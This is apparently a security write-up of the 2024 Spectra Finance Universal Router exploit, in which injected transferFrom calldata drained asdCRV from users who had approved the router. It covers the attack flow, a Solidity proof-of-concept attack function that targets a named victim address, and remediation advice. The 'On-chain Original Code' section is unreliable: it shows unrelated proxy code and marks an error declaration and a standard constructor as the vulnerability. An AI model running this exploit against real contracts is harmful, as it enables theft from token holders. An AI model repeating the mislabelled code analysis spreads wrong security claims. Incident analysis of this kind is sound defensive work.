# Spectra Finance — Universal Router Authorization Bypass Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-07-19 |
| **Protocol** | Spectra Finance |
| **Chain** | Ethereum |
| **Loss** | ~73,000 USD |
| **Attacker** | [0x53635bf7](https://etherscan.io/address/0x53635bf7b92b9512f6de0eb7450b26d5d1ad9a4c) |
| **Attack Tx** | [0x491cf8b2](https://app.blocksec.com/explorer/tx/eth/0x491cf8b2a5753fdbf3096b42e0a16bc109b957dc112d6537b1ed306e483d0744) |
| **Vulnerable Contract** | [0x3d20601a](https://etherscan.io/address/0x3d20601ac0Ba9CAE4564dDf7870825c505B69F1a) |
| **Root Cause** | Universal Router's execute() function allows arbitrary token transferFrom execution |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-07/Spectra_finance_exp.sol) |

---
## 1. Vulnerability Overview

The `execute()` function (selector `0x3593564c`) of the Spectra Finance Universal Router accepts commands and data to execute swaps. The attacker injected `transferFrom(victim, attacker, amount)` calldata into this function, draining asdCRV tokens from victims who had approved the router. Because the router acts as an intermediary, the victim's approval was exploited by the attacker.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable execute: no validation of command data
function execute(
    bytes calldata commands,    // command type to execute
    bytes[] calldata inputs,    // command input data
    uint256 deadline
) external payable {
    // commands = 0x12 (specific swap command)
    // inputs[0] can contain arbitrary calldata
    // ❌ transferFrom(victim, attacker) injection possible
}

// ✅ Fix: block token transfer calldata within inputs
// require(!isTransferSelector(inputs[i]), "transfer not allowed in inputs");
```

### On-chain Original Code

Source: Sourcify verified

```solidity
// File: AMTransparentUpgradeableProxy.sol
contract AMTransparentUpgradeableProxy is ERC1967Proxy {
    // An immutable address for the admin to avoid unnecessary SLOADs before each call
    // at the expense of removing the ability to change the admin once it's set.
    // This is acceptable if the admin is always a ProxyAdmin instance or similar contract
    // with its own ability to transfer the permissions to another account.
    address private immutable _admin;

    /**
     * @dev The initial authority is not a valid account. (eg. `address(0)`)
     */
    error AMInvalidInitialAuthority(address initialAuthority);  // ❌ vulnerability
    /**
     * @dev The proxy caller is the current admin, and can't fallback to the proxy target.
     */
    error ProxyDeniedAdminAccess();

    /**
     * @dev Initializes an upgradeable proxy managed by an instance of a {ProxyAdmin} with an `initialOwner`,
     * backed by the implementation at `_logic`, and optionally initialized with `_data` as explained in
     * {ERC1967Proxy-constructor}.
     */
    constructor(
        address _logic,
        address initialAuthority,
```

```solidity
// File: ERC1967Proxy.sol
contract ERC1967Proxy is Proxy {
    /**
     * @dev Initializes the upgradeable proxy with an initial implementation specified by `implementation`.
     *
     * If `_data` is nonempty, it's used as data in a delegate call to `implementation`. This will typically be an
     * encoded function call, and allows initializing the storage of the proxy like a Solidity constructor.
     *
     * Requirements:
     *
     * - If `data` is empty, `msg.value` must be zero.
     */
    constructor(address implementation, bytes memory _data) payable {  // ❌ vulnerability
        ERC1967Utils.upgradeToAndCall(implementation, _data);
    }

    /**
     * @dev Returns the current implementation address.
     *
     * TIP: To get this value clients can read directly from the storage slot shown below (specified by EIP1967) using
     * the https://eth.wiki/json-rpc/API#eth_getstorageat[`eth_getStorageAt`] RPC call.
     * `0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc`
     */
    function _implementation() internal view virtual override returns (address) {
        return ERC1967Utils.getImplementation();
    }
}
```

## 3. Attack Flow

```
Attacker
  │
  ├─[1]─▶ Identify victim address and asdCRV balance
  │         victim = 0x279a7DBFaE376427FFac52fcb0883147D42165FF
  │
  ├─[2]─▶ Construct malicious inputs
  │         inputs[0] = abi.encode(
  │           asdCRV,             // token
  │           ETH_ADDRESS,
  │           0,
  │           attacker,           // recipient
  │           1,
  │           transferFrom(victim, attacker, balance)  // ❌ injection
  │         )
  │
  ├─[3]─▶ Router.execute(0x12, inputs, deadline)
  │         └─ asdCRV.transferFrom(victim, attacker) executed
  │
  └─[4]─▶ ~73K USD worth of asdCRV drained
```

## 4. PoC Code

```solidity
function attack() public {
    bytes memory datas = abi.encode(
        address(asdCRV),
        address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE),
        0,
        address(this),   // attacker as recipient
        1,
        // ❌ transferFrom(victim, attacker, balance) injection
        abi.encodeWithSelector(
            bytes4(0x23b872dd),
            address(victim),
            address(this),
            asdCRV.balanceOf(address(victim))
        )
    );
    bytes memory command = hex"12";
    bytes[] memory data = new bytes[](1);
    data[0] = datas;

    // Execute Universal Router — drain victim's assets
    address(VulnContract).call(
        abi.encodeWithSelector(bytes4(0x3593564c), command, data, block.timestamp + 20)
    );
}
```

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Arbitrary External Call |
| **Attack Vector** | Universal Router command injection |
| **CWE** | CWE-20: Improper Input Validation |
| **DASP** | Access Control Vulnerability |
| **Severity** | High |

## 6. Remediation Recommendations

1. **Command Whitelist**: Process only permitted swap command types
2. **Block transferFrom**: Prohibit ERC20 token transfer function selectors within inputs
3. **Recipient Validation**: Verify that the command recipient matches msg.sender
4. **Fork Testing**: Security testing against major command combinations

## 7. Lessons Learned

- The Universal Router pattern's high flexibility demands proportionally stricter input validation.
- Token approvals granted by users to the router are assets that attackers can exploit.
- This is the same pattern as the LiFi Protocol incident (same month), representing a common vulnerability across the industry.